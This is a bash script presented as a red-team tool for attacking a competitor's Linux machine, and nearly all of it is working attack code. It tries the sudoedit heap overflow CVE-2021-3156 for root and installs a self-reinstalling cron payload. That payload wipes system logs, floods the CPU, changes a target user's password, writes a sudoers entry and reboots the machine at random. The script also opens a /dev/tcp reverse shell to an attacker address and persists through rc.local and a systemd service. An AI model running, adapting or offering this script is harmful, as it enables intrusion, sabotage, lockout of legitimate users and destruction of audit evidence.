#!/bin/bash

# Red Team - Annoyance and High-Level Privilege Escalation Script
# This script creates malicious cron jobs, escalates privileges, and locks out competitors

TARGET_USER="targetuser"  # Competitor's user
CRON_CMD="/bin/bash /tmp/annoy.sh"
ATTACKER_IP="192.168.1.100"
ATTACKER_PORT="4444"
ESCALATION_LOG="/tmp/escalation.log"

# Step 1: Privilege Escalation
# Attempt to escalate privileges using known vulnerabilities (e.g., CVE-2021-3156, dirtycow)
echo "[+] Attempting privilege escalation..."

# Trying CVE-2021-3156 (Baron Samedit)
sudoedit -s '\' $(perl -e 'print "A" x 65536') || true

# Check if we are root
if [ "$(id -u)" -eq 0 ]; then
    echo "[+] Privilege escalation successful! Running as root." | tee -a $ESCALATION_LOG
else
    echo "[!] Privilege escalation failed. Continuing as $(whoami)." | tee -a $ESCALATION_LOG
fi

# Step 2: Set up self-healing cron job (re-adds itself every minute)
echo "[+] Setting up self-healing cron job..."

# Annoyance script that continually re-adds itself
cat << 'EOF' > /tmp/annoy.sh
#!/bin/bash
CRON_CMD="/bin/bash /tmp/annoy.sh"

# Re-add itself to cron every minute
(crontab -l 2>/dev/null; echo "* * * * * $CRON_CMD") | crontab -

# Log deletion to hide traces
echo "Clearing logs to cover tracks..."
echo > /var/log/auth.log
echo > /var/log/syslog
echo > /var/log/kern.log
echo > /var/log/messages

# Annoyance: fill the system with useless CPU tasks
for i in {1..50}; do
    yes > /dev/null &
done

# Lock out competitors by changing their password every minute
echo "targetuser:newpassword" | chpasswd

# Disabling sudo for target user
echo "$TARGET_USER ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$TARGET_USER

# Reboot the system randomly to annoy users
if (( RANDOM % 10 == 0 )); then
    reboot
fi
EOF

chmod +x /tmp/annoy.sh

# Install the cron job
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash /tmp/annoy.sh") | crontab -

# Step 3: Start reverse shell as root (if escalation was successful)
if [ "$(id -u)" -eq 0 ]; then
    echo "[+] Launching reverse shell as root to attacker..."
    /bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
fi

# Step 4: Modify critical system services for persistence (init/systemd)
echo "[+] Embedding script in system startup services for persistence..."

# Embed the script in /etc/rc.local (for init-based systems)
if [ -f /etc/rc.local ]; then
    echo "/bin/bash /tmp/annoy.sh &" >> /etc/rc.local
    chmod +x /etc/rc.local
fi

# Embed the script in a systemd service (for systemd-based systems)
cat << EOF > /etc/systemd/system/annoy.service
[Unit]
Description=Annoyance Service

[Service]
ExecStart=/bin/bash /tmp/annoy.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable annoy.service
systemctl start annoy.service

# Final message
echo "[+] Annoyance script installed. The system will now be continuously attacked with cron jobs and privilege escalations!"